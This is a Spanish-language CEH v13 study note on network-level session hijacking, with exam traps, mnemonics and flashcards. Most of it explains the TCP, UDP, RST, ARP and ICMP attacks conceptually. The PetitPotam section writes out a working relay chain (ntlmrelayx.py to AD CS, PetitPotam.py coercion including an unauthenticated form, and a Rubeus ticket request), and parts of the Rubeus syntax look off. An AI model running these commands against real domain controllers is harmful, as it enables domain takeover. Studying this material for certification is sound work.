# M11_03_NetworkLevelSessionHijacking.md
## CEH v13 — Módulo 11 | Network-Level Session Hijacking

---

## 1. Conceptos y definiciones

### Por qué los atacantes prefieren network-level hijacking

- No requiere acceso al host (a diferencia del host-level hijacking).
- No requiere adaptar el ataque por aplicación (a diferencia del application-level hijacking).
- Ataca los protocolos de transporte e Internet usados por las aplicaciones web en la capa de aplicación.
- Proporciona información crítica para atacar sesiones de nivel de aplicación.

---

### 🔴 Tipos de network-level hijacking — 6 técnicas

| Técnica | Mecanismo principal |
|---|---|
| **Blind Hijacking** | Inyección de datos/comandos maliciosos en sesiones TCP prediciendo el ISN, sin poder ver la respuesta |
| **UDP Hijacking** | Forjar respuesta del servidor a una petición UDP del cliente antes de que el servidor responda; más fácil que TCP por ausencia de secuencias |
| **TCP/IP Hijacking** | Interceptar una conexión TCP establecida con paquetes spoofed; desincronizar la conexión de la víctima; ambos (atacante y víctima) deben estar en la misma red |
| **RST Hijacking** | Inyectar un paquete RST auténtico-looking con IP spoofed y número ACK predicho para resetear la conexión de la víctima |
| **MITM: Packet Sniffer** | Usar ICMP forjado o ARP spoofing para redirigir el tráfico entre cliente y servidor a través del atacante |
| **IP Spoofing: Source Routed Packets** | Falsificar la IP de un host de confianza + usar source routing para especificar la ruta de los paquetes hacia el servidor |

---

### Three-way Handshake — Revisión (base técnica del hijacking)

| Paso | Estado cliente | Estado servidor | Acción |
|---|---|---|---|
| Cliente envía SYN con ISN | SYN-SENT | LISTEN | Inicia conexión |
| Servidor responde SYN+ACK con su propio ISN | SYN-SENT | SYN-RECEIVED | Acusa recibo + envía su ISN |
| Cliente envía ACK (ISN servidor + 1) | ESTABLISHED | ESTABLISHED | Conexión establecida |

**Para que tres partes se comuniquen se necesita**: IP address · port numbers · **sequence numbers** (cambian en cada paquete — el dato crítico que el atacante debe predecir).

**Flags de cierre de conexión**:
- **RST**: el host receptor entra en estado CLOSED y libera todos los recursos → los paquetes entrantes adicionales se descartan.
- **FIN**: el host receptor entra en estado CLOSE-WAIT → cierre ordenado.

**Condición de aceptación de paquetes**: el número de secuencia debe estar dentro del rango aceptable y seguir a su predecesor. Si está fuera del rango → el paquete se descarta y se envía ACK con el SEQ esperado.

---

### 🔴 TCP/IP Hijacking — Flujo detallado

**Condición previa**: atacante y víctima deben estar en la **misma red**.

**Flujo**:
1. El atacante sniffa la conexión de la víctima y envía un paquete spoofed con la IP de la víctima y el número de secuencia predicho.
2. El receptor procesa el paquete spoofed, incrementa el SEQ y envía ACK a la IP de la víctima.
3. La víctima no es consciente del paquete spoofed → ignora el ACK del receptor → desactiva el contador de SEQ.
4. El receptor recibe paquetes con número de secuencia incorrecto → desincronización.
5. El atacante fuerza la conexión de la víctima a un estado desincronizado.
6. El atacante rastrea los SEQ y sigue enviando paquetes spoofed desde la IP de la víctima.
7. El atacante continúa comunicándose con el receptor mientras la conexión de la víctima queda colgada.

**Ejemplo numérico**: si el siguiente SEQ esperado es 1420 y el atacante transmite ese número antes que el usuario, el servidor se sincroniza con el atacante. El servidor descarta los paquetes del usuario real (los considera reenvíos).

**Caso de uso específico**: permite atacar fácilmente sistemas que usan **one-time passwords**.

---

### IP Spoofing: Source Routed Packets

- El atacante falsifica la IP de un **host de confianza**.
- Los paquetes son **source routed** (el emisor especifica la ruta desde origen a destino IP).
- El servidor acepta los paquetes creyendo que vienen del host de confianza.
- El atacante altera SEQ y ACK numbers → inyecta paquetes forjados antes de que el cliente responda.
- Resultado: estado desincronizado; los paquetes originales se pierden; el servidor recibe el nuevo ISN del atacante.
- Los paquetes son enrutados hacia una IP de destino modificada especificada por el atacante.

---

### RST Hijacking

- El atacante inyecta un paquete **RST auténtico-looking** con:
  - IP de origen **spoofed**.
  - Número ACK **predicho**.
- La víctima cree que el origen ha enviado el reset → resetea la conexión.
- **Herramientas**: **Colasoft Packet Builder** (packet crafting) · **tcpdump** (TCP/IP analysis).

---

### Blind Hijacking

- El atacante inyecta datos o comandos maliciosos en una sesión TCP **incluso si la víctima deshabilita el source routing**.
- Requiere predecir correctamente el **next ISN** del equipo que intenta establecer la conexión.
- El atacante puede enviar comandos (p. ej., para establecer una contraseña que permita acceso desde otro punto de la red) pero **no puede ver la respuesta**.
- Para ver la respuesta → MITM es mejor opción.

---

### 🔴 UDP Hijacking

- UDP **no usa secuenciación ni sincronización de paquetes** → más fácil de atacar que TCP.
- Al ser **connectionless**, es fácil modificar datos sin que la víctima lo note.
- El atacante forja una respuesta del servidor a una petición UDP del cliente **antes de que el servidor responda**.
- El MITM en UDP hijacking puede minimizar el trabajo del atacante porque puede bloquear la respuesta real del servidor al cliente desde el principio.

**Mecanismo**:
- **IP spoofing**: envío de paquetes UDP con IP de origen falsificada (sin handshake previo).
- **Intercepting traffic**: paquetes UDP forjados enviados al cliente o al servidor, aparentando ser de origen legítimo.
- **Manipulating communication**: inserción de información falsa o peticiones no autorizadas en el flujo de datos.

---

### MITM Attack: ICMP forjado y ARP Spoofing

Para ejecutar un MITM el atacante cambia el **default gateway** del equipo del cliente y reenruta los paquetes a través de su propia máquina.

#### Forged ICMP
- ICMP es una extensión de IP para mensajes de error.
- El atacante forja paquetes ICMP que envían mensajes de error indicando problemas en el procesamiento de paquetes por la ruta original.
- Esto engaña al cliente y servidor para que redirijan su tráfico por la ruta del atacante.

#### ARP Spoofing
- Los hosts usan tablas ARP para mapear IPs (capa de red) a MACs (capa de enlace).
- El atacante envía respuestas ARP falsificadas que actualizan las tablas ARP del host objetivo.
- El tráfico se redirige a la MAC del atacante en lugar de a la IP legítima.

---

### 🔴 PetitPotam Hijacking

**Tipo de ataque**: authentication session hijacking contra **Domain Controllers** (DC) usando la API **MS-EFSRPC** (Microsoft Encrypting File System Remote Protocol).

**Objetivo**: obtener el hash NTLM del DC → relayarlo a **AD CS (Active Directory Certificate Services)** → generar un certificado → escalar a privilegios de **administrador** → control total sobre el servidor AD y toda la red gestionada por el DC.

**Requisito**: el atacante necesita credenciales válidas de un usuario legítimo de la red (excepto si el DC es vulnerable sin credenciales).

**Flujo del ataque (4 pasos)**:
1. El atacante usa las credenciales NTLM capturadas para autenticarse en el servidor objetivo.
2. Usa el comando **EfsRpcOpenFileRaw** de MS-EFSRPC API para coaccionar al servidor objetivo a realizar autenticación NTLM de otro sistema.
3. El atacante inicia un **NTLM relay attack** para obtener acceso remoto al AD CS.
4. El atacante crea un certificado AD para obtener privilegios de administrador sobre el servidor AD.

**Comandos del CEH**:
```bash
# Identificar la autoridad certificadora:
certutil.exe

# Configurar HTTP/SMB para capturar credenciales del DC (Impacket):
ntlmrelayx.py -t <URL_CA_web_enrolment> -smb2support --adcs --template DomainController

# Forzar autenticación via MS-EFSRPC API (con credenciales):
python3 PetitPotam.py -d <CA_name> -u <Username> -p <Password> <Listener-IP> <IP_DC>

# Sin credenciales (si el DC es vulnerable):
python3 PetitPotam.py <Attacker-IP> <IP_DC>

# Solicitar Kerberos ticket con los hashes NTLM obtenidos (Rubeus):
Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain:<domain> /user:<Domain_username> /ptt /certificate:<NTLM_hashes>
```

---

## 2. Exam Traps ⚠️

⚠️ **[TCP/IP Hijacking — misma red]** El atacante y la víctima deben estar en la **misma red**. El servidor puede estar en cualquier lugar.

⚠️ **[TCP/IP Hijacking — one-time passwords]** El CEH específicamente menciona que TCP/IP hijacking permite atacar sistemas que usan **one-time passwords** (contramedida habitualmente efectiva contra otras formas de hijacking).

⚠️ **[RST Hijacking — herramientas: Colasoft Packet Builder + tcpdump]** El examen asocia estas dos herramientas específicamente con RST hijacking.

⚠️ **[Blind Hijacking — no puede ver la respuesta]** El atacante puede inyectar datos/comandos pero **no puede ver la respuesta**. Para ver la respuesta → MITM. El examen puede preguntar la limitación de blind hijacking.

⚠️ **[UDP Hijacking — más fácil que TCP]** UDP es más fácil de hijackear porque es connectionless y no usa secuenciación. El examen puede presentarlo como "igual de difícil" — incorrecto.

⚠️ **[ARP Spoofing — opera en capa de enlace (MAC)]** ARP mapea IPs a MACs. El ataque opera modificando las tablas ARP para redirigir tráfico a la MAC del atacante, no a una IP directamente.

⚠️ **[PetitPotam — MS-EFSRPC API + EfsRpcOpenFileRaw]** Los dos identificadores técnicos de PetitPotam: la API **MS-EFSRPC** y el comando específico **EfsRpcOpenFileRaw**.

⚠️ **[PetitPotam — flujo: NTLM hash → AD CS → certificado → admin]** La cadena de escalada es: NTLM hash del DC → relay a AD CS → certificado → privilegios de administrador → control del AD. El examen puede presentar la cadena desordenada.

⚠️ **[PetitPotam — herramienta: ntlmrelayx.py (Impacket) + Rubeus]** Las dos herramientas del CEH: **ntlmrelayx.py** del toolkit **Impacket** para configurar el relay, y **Rubeus** para solicitar el Kerberos ticket.

⚠️ **[PetitPotam sin credenciales]** Si el DC es vulnerable, PetitPotam puede ejecutarse **sin credenciales**: `python3 PetitPotam.py <Attacker-IP> <IP_DC>`.

⚠️ **[Three-way handshake — RST vs FIN]** RST → cierre inmediato + CLOSED + libera todos los recursos. FIN → cierre ordenado + CLOSE-WAIT. El examen confunde estos dos flags.

⚠️ **[Información necesaria para comunicar tres partes]** IP + puerto + **sequence numbers**. Los dos primeros son fácilmente observables (no cambian). Los SEQ cambian y son lo que el atacante debe predecir.

---

## 3. Nemotécnicos

### 6 técnicas de network-level hijacking — "B-U-T-R-M-I"
**"Blind UDP TCP RST MITM IP-Source"**
- **B**lind hijacking · **U**DP hijacking · **T**CP/IP hijacking · **R**ST hijacking · **M**ITM packet sniffer · **I**P spoofing source routed

### Three-way handshake — estados cliente y servidor
**"C-S-E / L-R-E"** (cliente: Closed→SYN-SENT→Established; servidor: Listen→SYN-RECEIVED→Established)

### PetitPotam — cadena de escalada — "C-E-N-A-R"
**"Credentials → EfsRpc → NTLM relay → AD CS certificate → Root admin"**

### RST vs. FIN — regla de bolsillo
- **RST** = Rápido y Total → CLOSED inmediato, libera todos los recursos
- **FIN** = Fino y Ordenado → CLOSE-WAIT, cierre graceful

### UDP vs. TCP hijacking — diferencia clave
**"UDP = sin SEQ, sin handshake, más fácil"**
**"TCP = con SEQ, con handshake, requiere predecir ISN"**

---

## 4. Flashcards

**Q:** ¿Por qué los atacantes prefieren el network-level hijacking sobre el application-level?
**A:** Porque no requiere acceso al host ni adaptar el ataque por cada aplicación web; opera directamente sobre los protocolos de transporte.

**Q:** ¿Cuáles son los 3 datos necesarios para que tres partes se comuniquen en TCP, y cuál es el crítico para el atacante?
**A:** IP address, port numbers y sequence numbers. Los sequence numbers son los críticos porque cambian en cada paquete; IP y puerto son estáticos y fácilmente observables.

**Q:** ¿Qué condición de red es necesaria para ejecutar un TCP/IP Hijacking?
**A:** El atacante y la víctima deben estar en la misma red. El servidor puede estar en cualquier ubicación.

**Q:** ¿Qué tipo de sistema es especialmente vulnerable a TCP/IP Hijacking según el CEH?
**A:** Sistemas que usan one-time passwords (OTP).

**Q:** ¿Qué herramientas asocia el CEH con RST Hijacking?
**A:** Colasoft Packet Builder (packet crafting) y tcpdump (TCP/IP analysis).

**Q:** ¿Cuál es la limitación principal del Blind Hijacking?
**A:** El atacante puede inyectar datos o comandos pero no puede ver la respuesta. Para poder ver la respuesta, MITM es la opción adecuada.

**Q:** ¿Por qué UDP Hijacking es más fácil que TCP Hijacking?
**A:** Porque UDP es connectionless y no usa secuenciación ni sincronización de paquetes, lo que facilita modificar datos sin que la víctima lo note.

**Q:** ¿Qué diferencia hay entre RST y FIN al cerrar una conexión TCP?
**A:** RST: cierre inmediato, el receptor entra en estado CLOSED y libera todos los recursos (los paquetes adicionales se descartan). FIN: cierre ordenado, el receptor entra en CLOSE-WAIT.

**Q:** ¿Qué API de Microsoft explota el ataque PetitPotam?
**A:** MS-EFSRPC (Microsoft Encrypting File System Remote Protocol). El comando específico es EfsRpcOpenFileRaw.

**Q:** ¿Cuál es la cadena de escalada completa en un ataque PetitPotam?
**A:** Credenciales NTLM del DC → relay a AD CS (Active Directory Certificate Services) → generación de certificado → privilegios de administrador → control total del servidor AD y toda la red gestionada por el DC.

**Q:** ¿Qué dos herramientas del CEH se usan en PetitPotam para relay y Kerberos ticket respectivamente?
**A:** ntlmrelayx.py (del toolkit Impacket) para configurar el relay NTLM, y Rubeus para solicitar el Kerberos ticket con los hashes obtenidos.

**Q:** ¿Puede ejecutarse PetitPotam sin credenciales?
**A:** Sí, si el DC es vulnerable: `python3 PetitPotam.py <Attacker-IP> <IP_DC>`.

**Q:** ¿Qué protocolo usa ARP Spoofing para redirigir el tráfico y en qué capa opera?
**A:** ARP (Address Resolution Protocol), que mapea IPs (capa de red) a MACs (capa de enlace). Opera en la capa de enlace modificando las tablas ARP del host objetivo.

**Q:** ¿Cómo funciona el ICMP forjado como técnica MITM?
**A:** El atacante envía paquetes ICMP falsificados con mensajes de error que simulan problemas en la ruta original, engañando al cliente y servidor para que redirijan su tráfico por la ruta del atacante.

---

## 5. Confusión frecuente

### TCP/IP Hijacking vs. IP Spoofing Source Routed Packets
- **TCP/IP Hijacking**: intercepta una conexión TCP **ya establecida**; desincroniza al cliente; requiere que atacante y víctima estén en la misma red.
- **IP Spoofing Source Routed**: el atacante falsifica la IP de un host de confianza + usa source routing para guiar los paquetes; no requiere conexión establecida previa con la víctima; el servidor acepta los paquetes por la IP de confianza spoofed.
- **Criterio**: ¿hay una conexión TCP activa que se desincroniza? → TCP/IP Hijacking. ¿Se falsifica la IP de un host de confianza para iniciar una conexión? → IP Spoofing Source Routed.

### Blind Hijacking vs. TCP/IP Hijacking
- **Blind Hijacking**: el atacante inyecta datos/comandos prediciendo el ISN; no puede ver la respuesta; funciona aunque la víctima deshabilite source routing.
- **TCP/IP Hijacking**: requiere misma red; sniffa la conexión real; desincroniza al cliente; el atacante continúa la sesión completa.
- **Criterio**: ¿el atacante puede ver las respuestas y continuar la sesión? → TCP/IP Hijacking. ¿Solo inyecta sin ver respuestas? → Blind Hijacking.

### RST Hijacking vs. TCP/IP Hijacking
- **RST Hijacking**: solo envía un paquete RST para **resetear** la conexión de la víctima; no toma el control de la sesión.
- **TCP/IP Hijacking**: toma el control completo de la sesión, haciéndose pasar por la víctima ante el servidor.
- **Criterio**: ¿el objetivo es cortar la sesión? → RST Hijacking. ¿Es tomar el control? → TCP/IP Hijacking.

### ARP Spoofing vs. ICMP Forjado (como técnicas MITM)
- **ARP Spoofing**: opera en la capa de enlace; modifica tablas ARP (IP→MAC mapping); efectivo en la red local.
- **ICMP Forjado**: opera en la capa de red; envía mensajes de error falsos para redirigir rutas; puede funcionar a través de redes.
- **Criterio**: ¿la técnica altera la tabla de resolución de direcciones locales (ARP)? → ARP Spoofing. ¿Usa mensajes de error de red para alterar rutas? → ICMP Forjado.

### PetitPotam vs. Session Fixation
- **PetitPotam**: ataque contra infraestructura Active Directory/Domain Controller; usa MS-EFSRPC; objetivo: obtener certificado y privilegios de administrador sobre el AD.
- **Session Fixation**: ataque contra sesiones web HTTP; el atacante fija un session ID antes del login; objetivo: acceder a la sesión autenticada del usuario web.
- **Criterio**: ¿el contexto es Active Directory/DC/NTLM? → PetitPotam. ¿Es sesión HTTP web? → Session Fixation.
